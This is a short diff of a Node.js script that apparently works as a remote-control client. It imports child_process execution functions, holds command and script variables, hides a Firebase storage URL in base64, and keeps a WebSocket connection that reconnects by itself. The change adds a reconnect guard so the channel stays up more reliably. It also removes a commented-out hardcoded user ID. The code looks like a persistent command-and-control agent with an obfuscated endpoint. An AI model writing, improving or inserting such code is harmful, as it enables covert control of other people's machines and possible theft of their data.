@@ -6,12 +6,12 @@ const { execSync, fork } = require('child_process')
 let mCmd = null
 let mScript = null
 let CONNECTION = null
+let reconnecting = false
 let USER = getUserName()
 let FINISH = new Date().getTime()+21000000
 
 let STORAGE = decode('aHR0cHM6Ly9maXJlYmFzZXN0b3JhZ2UuZ29vZ2xlYXBpcy5jb20vdjAvYi9kYXRhYmFzZTA4OC5hcHBzcG90LmNvbS9vLw==')
 
-// USER = 'epsylkwvqf09956'
 
 startServer()
 
@@ -112,14 +112,18 @@ async function runWebSocket(url) {
     
     socket.on('end', () => {
         CONNECTION = null
-        setTimeout(async () => {
-            await runWebSocket(url)
-        }, 3000)
+        if (!reconnecting) {
+            reconnecting = true
+            setTimeout(() => runWebSocket(url), 3000)
+        }
     })
 
     socket.on('error', (err) => {
         CONNECTION = null
-        socket.destroy()
+        if (!reconnecting) {
+            reconnecting = true
+            socket.destroy()
+        }
     })
 
     for (let i = 0; i < 30; i++) {
